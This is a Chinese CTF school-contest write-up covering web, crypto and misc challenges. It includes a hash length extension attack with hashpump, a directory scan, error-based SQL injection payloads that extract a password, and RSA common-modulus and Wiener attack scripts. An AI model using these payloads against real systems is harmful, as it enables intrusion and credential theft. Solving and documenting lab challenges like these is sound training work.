---
title: 校赛 writeup
tags: [write-up]
date: 2016-12-26 15:53
---
web1.warmup-web打开响应消息头，发现路径/NOTHERE 访问即得flag2.web1看源码得到 index.txt<?php$flag=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;$secret = xxxxxxxxxxxxxxxxxxxxxxxxxxx; // guess it length :)$username = $_POST[userna
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><h1 id="web">web</h1>
<h2 id="1warmup-web">1.warmup-web</h2>
<p>打开响应消息头，发现路径/NOTHERE <br>
访问即得flag</br></p>
<h2 id="2web1">2.web1</h2>
<p>看源码得到 index.txt</p>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
<span class="hljs-variable">$flag</span>=<span class="hljs-string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;
<span class="hljs-variable">$secret</span> = <span class="hljs-string">"xxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>; <span class="hljs-comment">// guess it length :)</span>
<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">"username"</span>];
<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">"password"</span>];
<span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'albert'</span>];
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'albert'</span>])) {
<span class="hljs-keyword">if</span> (urldecode(<span class="hljs-variable">$username</span>) === <span class="hljs-string">"admin"</span> &amp;&amp; urldecode(<span class="hljs-variable">$password</span>) !==<span class="hljs-string">"admin"</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'albert'</span>] === md5(<span class="hljs-variable">$secret</span> . urldecode(<span class="hljs-variable">$username</span> . <span class="hljs-variable">$password</span>))) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Congratulations! here is your flag.\n"</span>;
        <span class="hljs-keyword">die</span> (<span class="hljs-string">"The flag is "</span>. <span class="hljs-variable">$flag</span>);
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">die</span> (<span class="hljs-string">"Cookie Not Correct"</span>);
    }
}
<span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">die</span> (<span class="hljs-string">"Go AWAY"</span>);
}
}
setcookie(<span class="hljs-string">"sample-hash"</span>, md5(<span class="hljs-variable">$secret</span> . urldecode(<span class="hljs-string">"admin"</span> . <span class="hljs-string">"admin"</span>)), time() + (<span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">7</span>));
<span class="hljs-preprocessor">?&gt;</span></span>
<span class="hljs-comment">&lt;!-- index.txt --&gt;</span></code></pre>
<p>由题易知是hash长度扩展攻击 <br>
在kali下运用hashpump进行攻击一开始不知道长度，利用爆破可知长度为26位</br></p>
<pre class="prettyprint"><code class=" hljs mathematica">&gt;&gt; hashpump
<span class="hljs-keyword">Input</span> <span class="hljs-keyword">Signature</span>: <span class="hljs-number">968</span>c31570a2a3afa076112687ecca974
<span class="hljs-keyword">Input</span> Data: admin
<span class="hljs-keyword">Input</span> Key <span class="hljs-keyword">Length</span>: <span class="hljs-number">26</span>
<span class="hljs-keyword">Input</span> Data to Add: pcat</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226144554814?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h2 id="3web2">3.web2</h2>
<p>这题直接运用kali DirBuster <br>
扫描目录扫到了 <br>
/x/index.php <br>
/.php <br>
/x/register.php <br>
/x/connect.php <br>
/x/login.php <br>
/flag.php <br>
最终答案在/flag.php中 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226151932421?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></br></br></br></br></br></p>
<h2 id="4web4">4.web4</h2>
<p>一道简单的报错注入题 <br>
利用burp截包修改id <br>
最后payload为</br></br></p>
<pre class="prettyprint"><code class=" hljs perl">id=<span class="hljs-number">1</span><span class="hljs-variable">%27</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> password from albertchang),<span class="hljs-number">0x5c</span>,<span class="hljs-number">1</span>))<span class="hljs-variable">%23</span>
或者是
id=-<span class="hljs-number">1</span><span class="hljs-variable">%27</span> <span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> password from albertchang),<span class="hljs-number">0x5c</span>,<span class="hljs-number">1</span>))<span class="hljs-variable">%23</span></code></pre>
<p>出来后 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226153119218?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
根据提示需要post flag = Th3_Pas3W0rd_i3_Albertchang <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226153219173?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
最后得到flag <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226153552132?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></br></img></br></p>
<h2 id="5web6">5.web6</h2>
<p>拿到这题时直接分析，网页源码 <br>
发现了隐藏的HTML文档 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161227013857083?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
知道了这题的知识点 <br>
<a href="http://baike.baidu.com/link?url=DJka0rDOTGori1Fs7otDdZiIURyhrdakNElGtnv8HeC6wzUaUZZbyJgFXzXVy3VHapHXp3I05YWFy6tQFkmg1gLhTQ4qR_H9eb_rBUNALdX01NkSf6fphT-xsE4BQYbQowCWI92ym3geG-MLrk_Hckj-_HSVn7gk4NbDfojoF0xu2qHDVR-wE42KW7LGM188YF_GYuc5SSLl5YmDX7IANK">流密码</a>其实就是逐比特异或 <br>
在隐藏部分发现异或过后的flag <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161227014137383?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
flag 的长度大于500 <br>
所以构造提交参数大于500和message逐比特异或 <br>
写脚本如下 <br>
这里有个坑，我用requests方法请求网页，获取不了隐藏的HTML内容 <br>
所以只能使用httplib方法</br></br></br></br></br></img></br></br></br></br></img></br></br></p>
<pre class="prettyprint"><code class=" hljs python"> <span class="hljs-comment"># yz:2016.12.25</span>
 <span class="hljs-comment"># -*- coding:utf-8 -*- </span>
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> httplib,urllib
data = urllib.urlencode({<span class="hljs-string">'arg'</span>:<span class="hljs-string">'11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'</span>});     
conn = httplib.HTTPConnection(<span class="hljs-string">"45.32.58.123:12223"</span>);
headers = {<span class="hljs-string">"Content-Type"</span>:<span class="hljs-string">"application/x-www-form-urlencoded"</span>,       
           <span class="hljs-string">"Connection"</span>:<span class="hljs-string">"Keep-Alive"</span>,<span class="hljs-string">"Referer"</span>:<span class="hljs-string">"http://45.32.58.123:12223/"</span>};       
conn.request(method=<span class="hljs-string">"POST"</span>,url=<span class="hljs-string">"/main.php"</span>,body=data,headers=headers);          
s = conn.getresponse();    
content = str(s.read())
Message = content[content.index(<span class="hljs-string">"Message:"</span>)+<span class="hljs-number">9</span>:content.index(<span class="hljs-string">"&lt;!-- Flag Here"</span>)-<span class="hljs-number">6</span>]
Message = Message.replace(<span class="hljs-string">r'\x'</span>,<span class="hljs-string">""</span>)
Message = int(Message,<span class="hljs-number">16</span>)
Flag = content[content.index(<span class="hljs-string">"Here"</span>)+<span class="hljs-number">5</span>:content.index(<span class="hljs-string">"--&gt;&lt;/body&gt;"</span>)]
s = <span class="hljs-string">''</span>
<span class="hljs-comment">#转成01比特</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Flag:
    temp = ord(i)
    temp = bin(temp)
    temp = str(temp)[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">if</span> len(temp) &lt; <span class="hljs-number">8</span>:
        temp = <span class="hljs-string">'0'</span>*(<span class="hljs-number">8</span>-len(temp))+temp
    s += temp
Flag = int(s,<span class="hljs-number">2</span>)
src = <span class="hljs-number">200686490938213618932925030686723900966346071385575706818931139925151927414142413276833387391430903367465157760813819133574082739102368183356464973743987837722948595492712901641873403594450204695713629139533103392519371071099952645246840782481900957871935637359154437252913405444179654300427180044691385965990823568106696476515287748546363867017174091051797450964111012257685851865814304288305868868796070362487761893449386893361922901844324634350334616783957894220005538964792468979405328145100453460098854853839989027847783206845004095945185162744506591411155318233223679027298329085177274095914773286471049161702613799175486411492003372288722716950913877957802694948679785419083224812096387329082981115878996013259272222472356069166820222490810121435442820722489119884073056358155724651716232802987659573867435059545130785856458655309902770151770043405778785036718566031651260115600041084237592155873140867644089767487877289411629787419400386757597222832981129288874883921314078446307643819572105712219875309974530695306897012252757579812647497998317030864635355185457048473443750962962325959236879327971895179877812488472241671023567097665713934032193125740463764283516105833757192335092325954137896621052635084041994822566883633L</span>
end = Flag^Message^src
s = str(hex(end))[<span class="hljs-number">2</span>:][:-<span class="hljs-number">1</span>]
string = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(s),<span class="hljs-number">2</span>):
    string += chr(int(s[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>))
<span class="hljs-keyword">print</span> string
conn.close();  </code></pre>
<p>最后得到</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20161227014702827?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h1 id="misc">misc</h1>
<h2 id="1warmup-misc">1.warmup-misc</h2>
<pre class="prettyprint"><code class=" hljs python">s=<span class="hljs-string">'UAUSAB1QUFBQUFAbfQ=='</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(s,k)</span>:</span>
    r=s.decode(<span class="hljs-string">'base64'</span>)
    l=<span class="hljs-string">''</span>
    <span class="hljs-keyword">assert</span> len(k)==<span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:
        l = l + chr(ord(i)^ord(k))
    <span class="hljs-keyword">return</span> l[:-<span class="hljs-number">1</span>]
<span class="hljs-keyword">print</span> decode(s,<span class="hljs-string">'f'</span>)</code></pre>
<h2 id="2zlmm">2.zlmm</h2>
<p>栅栏密码</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> re
s=<span class="hljs-string">"F e   canece odouarld{iarswsitt o N  fsseo zvgiyeipioantehi t ancheocm gaous oganwiakgaa ,absntns l rd ic   p+s notei. aimo ttejtntlca,lado d gi bhh.ooiiao  in nTeghlseee y gvnrgicdt hcrtlle rIoehimern  hPire ianfituntti e sterseaoov ln sd ymyawho o etfnesagc  o.aethadEcm   ssem adtff6a odamlocbh  aeimah l6rAsoyaamaeoowrsneyeba6smew,nmemapfhe j b ag}"</span>
l = len(s)
child = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,l):
    <span class="hljs-keyword">if</span> l%i == <span class="hljs-number">0</span>:
        child.append(i)
<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> child:
    s1=<span class="hljs-string">''</span>
    k = str(j)
    r = re.findall(<span class="hljs-string">'[^~]{'</span>+k+<span class="hljs-string">'}'</span>,s)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,j):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> r:
            s1 = s1 + j[i]
    <span class="hljs-keyword">if</span> <span class="hljs-string">'flag'</span> <span class="hljs-keyword">in</span> s1:
        <span class="hljs-keyword">print</span> s1
        <span class="hljs-keyword">break</span></code></pre>
<h2 id="3warmup-crypto">3.warmup-crypto</h2>
<p>BH=CWG=EO=IEI=;DEDEDEY  <br>
观察可得是凯撒密码</br></p>
<pre class="prettyprint"><code class=" hljs lua">s = <span class="hljs-string">'BH=CWG=EO=IEI=;DEDEDEY'</span>
l = len(s)
<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">25</span>,<span class="hljs-number">50</span>): 
    d = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> s:
        d = d + chr(ord(t)+j)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'flag'</span> <span class="hljs-keyword">in</span> d:
        <span class="hljs-built_in">print</span> d</code></pre>
<h2 id="4warmup-game">4.warmup-game</h2>
<p>在bibi的游戏人生里找</p>
<h2 id="warmup-rsa">warmup-rsa</h2>
<pre class="prettyprint"><code class=" hljs handlebars"><span class="xml"><span class="hljs-tag"><span class="hljs-attribute">n1</span>=<span class="hljs-value">0x18f60afa6b9938df69338805ae7fbd5652da3ac8fa5b7b65e4755149ba3f80d071fe8845fa20ea3e57e21fb2f630e47e4886de35c51d1487c170a59141f833c3aaea62c539e20664dbfa75f1b2d56ed4dbec991e5bf3306931bfda79b1dd8466f808af159b44be042499d423110ab9cfd595e370029862e2e686ed2a27fb6b459c4fddc0ebd4f112e0f3769524412e7128eb04b02de421df5a0e5b22d2c40acf1727aa9093160bf6dbd862ac136a805a4e9c760c54d28ac5bf21d509d94e9e437e2e38a13664ec104dadc66f8c21b7b82e3e3570d27326e13df07dd72b6847f8e53aadeafa54cc879cfa2ae3b8028c39df36b097ba65688abadb78a06c16f393L</span>
<span class="hljs-attribute">n2</span>=<span class="hljs-value">0x18f60afa6b9938df69338805ae7fbd5652da3ac8fa5b7b65e4755149ba3f80d071fe8845fa20ea3e57e21fb2f630e47e4886de35c51d1487c170a59141f833c3aaea62c539e20664dbfa75f1b2d56ed4dbec991e5bf3306931bfda79b1dd8466f808af159b44be042499d423110ab9cfd595e370029862e2e686ed2a27fb6b459c4fddc0ebd4f112e0f3769524412e7128eb04b02de421df5a0e5b22d2c40acf1727aa9093160bf6dbd862ac136a805a4e9c760c54d28ac5bf21d509d94e9e437e2e38a13664ec104dadc66f8c21b7b82e3e3570d27326e13df07dd72b6847f8e53aadeafa54cc879cfa2ae3b8028c39df36b097ba65688abadb78a06c16f393L</span>
<span class="hljs-attribute">e1</span>=<span class="hljs-value">0x17e1</span>
<span class="hljs-attribute">e2</span>=<span class="hljs-value">0x43a5</span>
<span class="hljs-attribute">c1</span>=<span class="hljs-value">0xb6e66aa0d4d5ad1460482f45aab87e80a99c1ff3af605fd9cea82d76d464272f3dd2e1797e3fede64cffcd54b2a7a5e21f45574783f62266cebf3cdb9764c6c04b0b30b5d065d5f6142d498506ea1f6449f428253d4d76bd96778d5f58abf313370b980dcb90daf882c5539ac3df81a431bc2c0e0911ecbe5195d94312218b3854ee14f13bd00c81d7ff11c06a9e112940b7377c20e53738a2ebb77b0534d8d9e481e60e9c87693bd9e1fd1e569083479ff8f53e42337a2b799c2325a7e2588fb046cf228d01d8596e7af4570a3cb0635d2524d234e3993d76b7e60f1c478ba45891de5cc0a1fec116f7c0dd9be7aa54226edf0196e37856afca32c69d790e1L</span>
<span class="hljs-attribute">c2</span>=<span class="hljs-value">0x9bcbfea3c3130364bbcf352b7810df031293949ed147919dec3ecfdd48f77e9486ae811d95f8c79eb477f4424d475dc611536343c7e21c427e18593aae37982323f2c0f4e840fbf89b31edc8f79ad7f6511ee0e5605cfbba7ada7d8777e81ec0ac122e0ad5108e97fafc0cd31ed8c83f3e761b92bdbea1144b0c06c5ca43a7b4e9e0a2b15ee12509235c5695be54d9fd0725ac80abbf0f5e8f43539da3ce9464020099e031d8bca899f11638169196ac72aeaeb90dab851d801cf93044cc00dd94d93c8963201b26788a7c42ce45c496c0a597ac53cd55c60b8f38f3f7d1f8ecc2e4e40ba6fe0c6e605ebbfc9aa3da5ab810c783c1d9957bb5d00a89ab1bbdeL</span></span></span></code></pre>
<p>发现n1与n2相等，故使用共模攻击</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">import</span> sys;
sys.setrecursionlimit(<span class="hljs-number">100000</span>);
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a, b)</span>:</span>
  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:
    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
  <span class="hljs-keyword">else</span>:
    g, y, x = egcd(b % a, a)
    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modinv</span><span class="hljs-params">(a, m)</span>:</span>
  g, x, y = egcd(a, m)
  <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">'modular inverse does not exist'</span>)
  <span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">return</span> x % m
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
  n = int(raw_input(<span class="hljs-string">"input n:"</span>))
  c1 = int(raw_input(<span class="hljs-string">"input c1:"</span>))
  c2 = int(raw_input(<span class="hljs-string">"input c2:"</span>))
  e1 = int(raw_input(<span class="hljs-string">"input e1:"</span>))
  e2 = int(raw_input(<span class="hljs-string">"input e2:"</span>))
  s = egcd(e1, e2)
  s1 = s[<span class="hljs-number">1</span>]
  s2 = s[<span class="hljs-number">2</span>]
  <span class="hljs-comment"># 求模反元素</span>
  <span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:
    s1 = - s1
    c1 = modinv(c1, n)
  <span class="hljs-keyword">elif</span> s2&lt;<span class="hljs-number">0</span>:
    s2 = - s2
    c2 = modinv(c2, n)
  m = (c1**s1)*(c2**s2)%n
  <span class="hljs-keyword">print</span> m
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
  main()</code></pre>
<p>最后得到明文 <br>
2511413510842060413510067286707584738156534665355713590653 <br>
转为16进制，再转ascii得到flag <br>
flag{rsa_is_goodd112345}</br></br></br></p>
<h2 id="5wn">5.wn</h2>
<p>低解密指数攻击 <br>
直接利用GitHub上的代码</br></p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-string">'''
Created on Dec 14, 2011

@author: pablocelayes
'''</span>

<span class="hljs-keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hack_RSA</span><span class="hljs-params">(e,n)</span>:</span>
    <span class="hljs-string">'''
    Finds d knowing (e,n)
    applying the Wiener continued fraction attack
    '''</span>
    frac = ContinuedFractions.rational_to_contfrac(e, n)
    convergents = ContinuedFractions.convergents_from_contfrac(frac)
    <span class="hljs-keyword">for</span> (k,d) <span class="hljs-keyword">in</span> convergents:        
        <span class="hljs-comment">#check if d is actually the key</span>
        <span class="hljs-keyword">if</span> k!=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (e*d-<span class="hljs-number">1</span>)%k == <span class="hljs-number">0</span>:
            phi = (e*d-<span class="hljs-number">1</span>)//k
            s = n - phi + <span class="hljs-number">1</span>
            <span class="hljs-comment"># check if the equation x^2 - s*x + n = 0</span>
            <span class="hljs-comment"># has integer roots</span>
            discr = s*s - <span class="hljs-number">4</span>*n
            <span class="hljs-keyword">if</span>(discr&gt;=<span class="hljs-number">0</span>):
                t = Arithmetic.is_perfect_square(discr)
                <span class="hljs-keyword">if</span> t!=-<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (s+t)%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:
                    print(<span class="hljs-string">"Hacked!"</span>)
                    <span class="hljs-keyword">return</span> d
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_hack_RSA</span><span class="hljs-params">()</span>:</span>
    print(<span class="hljs-string">"Testing Wiener Attack"</span>)
    times = <span class="hljs-number">5</span>
    d=<span class="hljs-number">1</span>
    e=<span class="hljs-number">235308230249427956073994778236213308201165228968967264823632398966978083858618015310724273760982061608902488436041676909915097228896544054764485576608147425983433627672556840438360922524333914861841915302324033903747815478440207839231405164459309430488083417021299863448530761603691583119435411334929236989305080703733969737477059347874381118819315342999662421300865938367414646348114114523518559518198427990964401454548211551305162678178910564008966603832884326159914009915068561450603480793388907172483641086337688420637151051921455148790521653521635779290202539763111269020386581967559996128236288594127596931111L</span>
    n=<span class="hljs-number">990023173701890142960417396557829467604818405521894936859951202214773485865832785292323872121243887697290422045990013422607876480641270661367864382389893789596078312082027665553855270696451019054919069134732452191977525630655976091851072534780363846681322224621650105419018181198428165007342791192003551280877541234686022585373169611329463075555962420262841398957747472053420414997254472168650615854344763306064291593967460854817443906609759558144854063757076283269500492727802851281783673232830692457911612959175538769194685797000335876443248126827447575107633034183744580751790001353796972802669451070935734931493L</span>
    print(<span class="hljs-string">"(e,n) is ("</span>, e, <span class="hljs-string">", "</span>, n, <span class="hljs-string">")"</span>)  
    hacked_d = hack_RSA(e, n)  
    print(<span class="hljs-string">"d = "</span>, d, <span class="hljs-string">", hacked_d = "</span>, hacked_d)
    print(<span class="hljs-string">"-------------------------"</span>)
    times -= <span class="hljs-number">1</span>  
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment">#test_is_perfect_square()</span>
    <span class="hljs-comment">#print("-------------------------")</span>
    test_hack_RSA()</code></pre>
<p>解出</p>
<pre class="prettyprint"><code class=" hljs makefile"><span class="hljs-constant">d</span> = 30011L
<span class="hljs-constant">n</span> = 990023173701890142960417396557829467604818405521894936859951202214773485865832785292323872121243887697290422045990013422607876480641270661367864382389893789596078312082027665553855270696451019054919069134732452191977525630655976091851072534780363846681322224621650105419018181198428165007342791192003551280877541234686022585373169611329463075555962420262841398957747472053420414997254472168650615854344763306064291593967460854817443906609759558144854063757076283269500492727802851281783673232830692457911612959175538769194685797000335876443248126827447575107633034183744580751790001353796972802669451070935734931493L
<span class="hljs-constant">c</span> = 788476757386221543537703608890186546442886644502803697518028267920600460220013483242506024987780673274894640972913419348131638674650297913257698380629030789425241326400460779957736137653911242371819455834503315030302866040645836290957691445959653938430879900694828439435699643144568320527205094071390940553388594203187022623769818515793107513956737821245415004711757450202148161254040561612359947403387404625171790678861784947278421483221298384341596583699883571547913038896065048203584687131767988397347080214823075357248539577208665545930392234612492615041261379339566841377463503145318178415053741856403946928895L
<span class="hljs-constant">m</span> = c**d % n
print m</code></pre>
<h2 id="6d0ge">6.D0ge</h2>
<p>下载bftools</p>
<pre class="prettyprint"><code class=" hljs tex">C:<span class="hljs-command">\Users</span><span class="hljs-command">\YZ</span>&gt;C:<span class="hljs-command">\Users</span><span class="hljs-command">\YZ</span><span class="hljs-command">\Desktop</span><span class="hljs-command">\bftools</span><span class="hljs-command">\bftools</span><span class="hljs-command">\bftools</span>.exe decode braincopter C:<span class="hljs-command">\Users</span><span class="hljs-command">\YZ</span><span class="hljs-command">\Desktop</span><span class="hljs-command">\D</span>0ge.jpg -o -out.bf

C:<span class="hljs-command">\Users</span><span class="hljs-command">\YZ</span>&gt;C:<span class="hljs-command">\Users</span><span class="hljs-command">\YZ</span><span class="hljs-command">\Desktop</span><span class="hljs-command">\bftools</span><span class="hljs-command">\bftools</span><span class="hljs-command">\bftools</span>.exe run -out.bf
GYYWIY3UMZ5UQML6IIYHSLCXMVWEGMDNMUWVI3ZNJAZVEZL5</code></pre>
<p>base32解码得到flag</p>
<h2 id="7crypto300-basr">7.crypto300 basr</h2>
<p>下面为源代码，分析起来比较简单，但是坑比较多。</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> random
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pen</span><span class="hljs-params">(msg,k)</span>:</span>
    myl=string.printable[<span class="hljs-number">0</span>:<span class="hljs-number">62</span>]+<span class="hljs-string">"+/"</span>
    nell=[<span class="hljs-string">""</span>]*<span class="hljs-number">64</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">64</span>):
        nell[(i+k)%<span class="hljs-number">64</span>]=myl[i] <span class="hljs-comment">#copy myl to nell</span>
    nel=<span class="hljs-string">""</span>.join(nell)
    msg+=<span class="hljs-string">"/x00"</span>*(len(msg)%<span class="hljs-number">4</span>)
    bs=<span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> msg:
        bs+=<span class="hljs-string">"0"</span>*(<span class="hljs-number">8</span>-len(bin(ord(i))[<span class="hljs-number">2</span>:]))+bin(ord(i))[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">print</span> bs
    c=<span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(bs),<span class="hljs-number">6</span>):
        c+=nell[int(bs[i:i+<span class="hljs-number">6</span>],<span class="hljs-number">2</span>)]
    <span class="hljs-keyword">return</span> c
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(p,k)</span>:</span>
    q2=getPrime(<span class="hljs-number">1024</span>)
    n2=p*q2
    <span class="hljs-keyword">print</span> <span class="hljs-string">"q2"</span>,q2
    <span class="hljs-keyword">print</span> <span class="hljs-string">"n2"</span>,n2
    <span class="hljs-keyword">return</span> n2^(k%<span class="hljs-number">64</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    flag=open(<span class="hljs-string">"flag"</span>,<span class="hljs-string">"r"</span>).read().strip()
    m=bytes_to_long(flag)
    <span class="hljs-keyword">print</span> <span class="hljs-string">"m"</span>,m
    p=getPrime(<span class="hljs-number">1024</span>)
    <span class="hljs-keyword">print</span> <span class="hljs-string">"p"</span>,p
    q=getPrime(<span class="hljs-number">1024</span>)
    <span class="hljs-keyword">print</span> <span class="hljs-string">"q"</span>, q
    n=p*q
    <span class="hljs-keyword">print</span> <span class="hljs-string">"n"</span>,n
    s=<span class="hljs-string">""</span>
    s+=hex(n)+<span class="hljs-string">"\n"</span>
    e=<span class="hljs-number">65537</span>
    c=pow(m,e,n)
    <span class="hljs-keyword">print</span> <span class="hljs-string">"c"</span>,c
    cipher=long_to_bytes(c)
    k=random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">0xffffffffff</span>)<span class="hljs-comment">#get assume len random</span>
    <span class="hljs-keyword">print</span> <span class="hljs-string">"k"</span>,k
    s+=pen(cipher,k)+<span class="hljs-string">"\n"</span>
    s+=hex(backdoor(p,k))
    open(<span class="hljs-string">"info"</span>,<span class="hljs-string">"w"</span>).write(s)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()</code></pre>
<p>下面是我写的解密脚本</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment"># encoding:utf-8</span>
<span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> gcd,invmod
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long
<span class="hljs-keyword">import</span> string
